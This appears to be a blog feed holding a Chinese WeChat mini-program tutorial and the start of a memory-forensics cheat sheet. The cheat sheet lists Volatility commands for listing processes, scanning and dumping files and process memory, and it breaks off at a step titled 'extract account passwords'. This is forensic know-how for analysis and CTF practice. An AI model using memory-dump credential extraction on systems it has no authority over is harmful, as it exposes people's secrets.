 &#125;,</span><br></pre></td></tr></table></figure><p>audio组件：</p><ul><li>src：要播放音频的资源地址</li><li>poster：默认控件上的音频封面的图片资源地址</li><li>name：默认控件上的音频名字</li><li>author：默认控件上的作者名字</li></ul><p>可能由于audio组件使用的场景和频次都非常低，audio组件以后就要被抛弃了，需要用到小程序的API来创建音乐播放。</p><h3 id="0x003-video组件"><a href="#0x003-video组件" class="headerlink" title="0x003 video组件"></a>0x003 video组件</h3><p>video组件用来表示视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span> <span class="attr">initial-time</span>=<span class="string">&quot;100&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>video组件：</p><ul><li>autoplay：是否自动播放</li><li>loop：是否循环播放</li><li>muted：是否静音播放</li><li>inital-time：指定视频初始播放位置，单位是秒</li><li>controls：是否显示默认播放控件</li></ul><h3 id="0x004-cover效果"><a href="#0x004-cover效果" class="headerlink" title="0x004 cover效果"></a>0x004 cover效果</h3><p>可以把view、图片组件覆盖在地图map或视频video组件之上</p><p>适用条件情况：</p><p>希望在视频的左上角显示视频的标题以及在右上角显示商家的logo，就可以使用cover效果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;covertext&quot;</span>&gt;</span>腾讯大学：腾讯特色学习交流平台<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;coverimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://imgcache.qq.com/open_proj/proj_qcloud_v2/gateway/portal/css/img/nav/logo-bg-color.svg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.covertext</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500</span>rpx;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">20</span>rpx;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coverimg</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100</span>rpx;<span class="attribute">height</span>:<span class="number">23</span>rpx;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>:<span class="number">10</span>rpx;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-地图组件"><a href="#0x005-地图组件" class="headerlink" title="0x005 地图组件"></a>0x005 地图组件</h3><p>要想在地图上标记一个地点，首先我们需要知道该地点的经纬度，这个时候就需要使用到坐标拾取器的工具。</p><p><strong>经纬度获取：</strong><a href="https://lbs.qq.com/tool/getpoint/index.html">腾讯地图坐标拾取器</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myMap&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 300px;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">latitude</span>=<span class="string">&quot;&#123;&#123;latitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">longitude</span>=<span class="string">&quot;&#123;&#123;longitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">markers</span>=<span class="string">&quot;&#123;&#123;markers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">covers</span>=<span class="string">&quot;&#123;&#123;covers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">show-location</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line"><span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line"><span class="attr">markers</span>: [&#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">  <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><p><strong>在地图上标记多个点</strong></p><p>markers标记点用于在地图上显示标记的位置，它的<strong>数据类型</strong>是<strong>Array数组</strong></p><p>在markers里多添加几个坐标：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markers</span>: [</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">     <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">     <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">     <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.540576</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.933790</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;万利达科技大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.522807</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.935338</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯滨海大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.547400</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.944370</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;腾讯C2&#x27;</span></span><br><span class="line">     &#125;,    </span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><p>除了marker，还有以下属性:</p><ul><li>callout:点击marker出现气泡callout、以及气泡上的label，可以丰富点击地图标记弹出丰富的信息介绍；</li><li>circle：在地图上显示圆，比如用于显示方圆几公里，或者权重大小在地图的可视化</li><li>polygon：指定一系列坐标点，根据 points 坐标数据生成闭合多边形,，比如圈出实际的范围</li><li>polyline：指定一系列坐标点，从数组第一项连线至最后一项，比如跑步的路线</li></ul><h2 id="0x08-优化部署上线"><a href="#0x08-优化部署上线" class="headerlink" title="0x08 优化部署上线"></a>0x08 优化部署上线</h2><h3 id="0x001-小程序的转发功能"><a href="#0x001-小程序的转发功能" class="headerlink" title="0x001 小程序的转发功能"></a>0x001 小程序的转发功能</h3><p>只需要在小程序每个页面的js文件下的Page({ }） 里面，添加以下代码，小程序就有转发功能了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onShareAppMessage</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">from</span> === <span class="string">&#x27;button&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 来自页面内转发按钮</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">target</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;云开发技术训练营&#x27;</span>,</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&quot;pages/home/home,</span></span><br><span class="line"><span class="string">            imageUrl:&quot;</span><span class="attr">https</span>:<span class="comment">//hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;,</span></span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发成功</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><ul><li>title为转发的标题，如果不填，默认为当前小程序的名称；</li><li>path为当前页面路径，也可以为其他页面的路径，如果路径写错的话会显示“当前页面不存在”哦。</li><li>imageUrl为自定义图片路径，可以是本地文件路径或网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。如果不填写会取当前页面，从顶部开始，高度为 80% 屏幕宽度的图像作为转发图片</li></ul><h3 id="0x002-小程序配置的细节"><a href="#0x002-小程序配置的细节" class="headerlink" title="0x002 小程序配置的细节"></a>0x002 小程序配置的细节</h3><h4 id="0x0001-没有tabBar的小程序"><a href="#0x0001-没有tabBar的小程序" class="headerlink" title="0x0001 没有tabBar的小程序"></a>0x0001 没有tabBar的小程序</h4><p>删掉app.json的tabBar配置项即可。</p><h4 id="0x0002-下拉小程序不出现空白"><a href="#0x0002-下拉小程序不出现空白" class="headerlink" title="0x0002 下拉小程序不出现空白"></a>0x0002 下拉小程序不出现空白</h4><p>当下拉很多小程序的时候，都会出现一个白色的空白，很影响美观，但是如果在windows的配置项里把<strong>backgroundColor</strong>和<strong>navigationBarBackgroundColor</strong>的颜色配置成一样，下拉就不会有空白，比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;backgroundTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;light&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HackWork技术工坊&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;white&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><h4 id="0x0003-让整个页面背景变色"><a href="#0x0003-让整个页面背景变色" class="headerlink" title="0x0003 让整个页面背景变色"></a>0x0003 让整个页面背景变色</h4><p>可以通过直接设置page的样式来设置，在该页面的wxss文件里添加如下样式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#1772cb</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x0004-禁止页面下拉"><a href="#0x0004-禁止页面下拉" class="headerlink" title="0x0004 禁止页面下拉"></a>0x0004 禁止页面下拉</h4><p>适用情况：做的比较短</p><p>目的：增强用户体验，不希望用户可以下拉页面，因为下拉页面会有种页面松动的感觉</p><p>做法：可以在该页面的json文件里配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;window&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;disableScroll&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-自定义顶部导航栏"><a href="#0x003-自定义顶部导航栏" class="headerlink" title="0x003 自定义顶部导航栏"></a>0x003 自定义顶部导航栏</h3><p>适用情况：官方默认的导航栏只能对背景颜色进行更改，想要在导航栏添加一些比较酷炫的效果</p><p>做法：通过自定义导航栏实现，通过设置 app.json中页面配置的 navigationStyle(导航栏样式)配置项的值为 custom，即可实现自定义导航：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;navigationStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;custom&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>给小程序的页面配一个好看的壁纸,home.wxss</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.jpg</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x004-模板"><a href="#0x004-模板" class="headerlink" title="0x004 模板"></a>0x004 模板</h3><p>适用情况：希望<strong>所有的页面</strong>都有一个相同的底部版权信息</p><p>做法：</p><h4 id="0x0001-静态的页面片段"><a href="#0x0001-静态的页面片段" class="headerlink" title="0x0001 静态的页面片段"></a>0x0001 静态的页面片段</h4><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个foot.wxml，并输入以下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;foot&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-foot&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-desc&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;font-size:12px;bottom:20rpx;position:absolute;bottom:20rpx;width:100%&quot;</span>&gt;</span>云开发技术训练营<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在要引入的页面比如home.wxml的顶部，使用<strong>import</strong>引入这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/foot.wxml&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后在要显示的地方调用比如home.wmxl页面代码的最底部来调用这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x0002-动态的页面片段"><a href="#0x0002-动态的页面片段" class="headerlink" title="0x0002 动态的页面片段"></a>0x0002 动态的页面片段</h4><p>在页面的每一页都有一个相似的页面样式与结果，但是不同的页面有着不同的标题以及页面描述，用数据绑定就能很好的解决这个问题，不同的页面的js data里有不同的数据，而模板的wxml都是固定的框架。</p><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个head.wxml，并输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-title&quot;</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-line&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;desc&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;page-head-desc&quot;</span>&gt;</span>&#123;&#123;desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再给每个页面的js里的data里添加不同的title和desc信息，再来在页面先引入head.wxml，然后在指定的位置比如wxml代码的前面调用该模板。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/head.wxml&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意创建模板时，使用的是<code>&lt;template name=&quot;模板名&quot;&gt;&lt;/template&gt;</code>，而调用模板时，使用的是<code>&lt;template is=&quot;模板名&quot; /&gt;</code>，两者之间对应。</p><h3 id="0x005-小程序的客服"><a href="#0x005-小程序的客服" class="headerlink" title="0x005 小程序的客服"></a>0x005 小程序的客服</h3><p>适用情况：开发者在小程序内添加客服消息按钮组件，用户就可在小程序内唤起客服会话页面，给小程序发消息。而开发者（可绑定其他运营人员）也可以直接使用<a href="https://mpkf.weixin.qq.com/">微信公众平台网页版客服工具</a>或者移动端小程序客服小助手进行客服消息回复</p><p>做法：</p><p>在wxml文件里添加如下代码，即可唤起客服会话页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">open-type</span>=<span class="string">&quot;contact&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-web-view"><a href="#0x006-web-view" class="headerlink" title="0x006 web-view"></a>0x006 web-view</h3><p>承载网页的容器。会自动铺满整个小程序页面，<strong>个人类型的小程序暂不支持使用。</strong></p><p>web-view组件可<strong>打开关联的公众号的文章</strong></p><p>适用于自媒体用户</p><p>公众号文章可以使用第三方的工具比如秀米</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-view</span> <span class="attr">src</span>=<span class="string">&quot;https://mp.weixin.qq.com/cgi-bin/wx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">web-view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>web-view的也可以绑定备案好的域名，支持JSSDK的接口，因此很有小程序为了省开发成本，点击链接打开的都是网页，并没有做小程序的原生开发，这个就不再讨论范围之内了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memory Forensics</title>
      <link href="/2020/01/10/Memory-Forensics/"/>
      <url>/2020/01/10/Memory-Forensics/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><h2 id="内存取证工具volatility-的使用："><a href="#内存取证工具volatility-的使用：" class="headerlink" title="内存取证工具volatility 的使用："></a>内存取证工具<strong>volatility</strong> 的使用：</h2><blockquote><p>volatility -f &lt;文件名&gt; –profile&#x3D;&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用imageinfo插件来猜测dump文件的profile值：WinXPSP2x86</span><br><span class="line"></span><br><span class="line">root@kali:# volatility -f mem.vmem imageinfo</span><br><span class="line"></span><br><span class="line">grep是用来搜索特定的字符串，bgrep是用来搜索非文本数据模式和hexdump</span><br><span class="line"></span><br><span class="line">volatility –info    用于查看volatility已经添加的profile和插件信息</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw imageinfo     判断当前镜像信息，或kdbgscan，仅适合windows内存镜像</span><br></pre></td></tr></table></figure><blockquote><p>常见插件：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 notepad      查看当前展示的notepad文本</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 pslist    列出运行的进程，如果Exit所在的一列显示了日期时间，则表明该进程已经结束了</span><br><span class="line"></span><br><span class="line">Hivelist   列出缓存在内存中的注册表</span><br><span class="line"></span><br><span class="line">Filescan  扫描内存中的文件</span><br><span class="line"></span><br><span class="line">Dumpfiles      将内存中的缓存文件导出</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 Memdump -p 进程号 -D ./（导出目录）       将某个进程信息导出/根据pid dump出指定进程</span><br><span class="line"></span><br><span class="line">Foremost 2888.dmp    分析dump出的内存文件</span><br><span class="line"></span><br><span class="line">Svcscan  扫描windows的服务</span><br><span class="line"></span><br><span class="line">Connscan 查看网络连接</span><br><span class="line"></span><br><span class="line">Cmdscan 查看命令行上的操作</span><br></pre></td></tr></table></figure><h2 id="取证方法建议"><a href="#取证方法建议" class="headerlink" title="取证方法建议"></a>取证方法建议</h2><blockquote><p>收集数据的顺序很重要。必须首先收集易消失的数据。易失性数据是系统关闭时可能丢失的任何数据，例如连接到仍然在RAM中注册的网站。必须将先从最不稳定的证据中开始收集数据：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（1）缓存</span><br><span class="line"></span><br><span class="line">（2）路由表，进程表，内存</span><br><span class="line"></span><br><span class="line">（3）临时系统文件</span><br><span class="line"></span><br><span class="line">（4）硬盘</span><br><span class="line"></span><br><span class="line">（5）远程日志，监控数据</span><br><span class="line"></span><br><span class="line">（6）物理网络配置，网络拓扑</span><br><span class="line"></span><br><span class="line">（7）媒体文件（CD，DVD）</span><br></pre></td></tr></table></figure><h2 id="常见payload："><a href="#常见payload：" class="headerlink" title="常见payload："></a>常见payload：</h2><p>1.查看系统信息<br><code>volatility -f mem.raw imageinfo</code></p><p>在Suggested Profiles中找到操作系统的信息</p><p>2.查看运行程序列表<br><code>volatility -f mem.raw --profile=Win7SP1x64 pslist</code></p><p>部分常见进程分析：</p><p>wscntfy.exe，Windows系统关键进程，负责检查计算机的安全状态，包括防火墙、病毒防护软件、自动更新三个安全要素，如果这些服务状态不正常，系统就会在状态栏进行告警提示。这个进程也可能会被病毒软件和黑客程序伪装</p><p>ctfmon.exe，Microsoft Office产品套装的一部分，是有关输入法的一个可执行程序。它可以选择用户文字输入程序，和微软Office XP语言条。这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。另外，ctfmon.exe可能被感染上木马而成为病毒程序</p><p>wordpad.exe，是微软Microsoft Windows自带的免费字处理工具。</p><p>Conime.exe，输入法编辑器</p><p>Cmd.exe，windows系统的命令行程序</p><p>3.查看文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan</code></p><p>4.用grep命令过滤<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan |grep txt</code></p><p>5.提取文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e7c3420 -D aaa</code></p><p>6.看cmd下执行的文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 cmdscan</code></p><p>7.分离出cmd下执行的某个文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 memdump -p 2884 -D aaa</code><br>-p是进程号，flag的文件在进程号为2884，分离出的文件为流量包</p><p>8.提取账户密码<br><code>volatility -f mem.raw 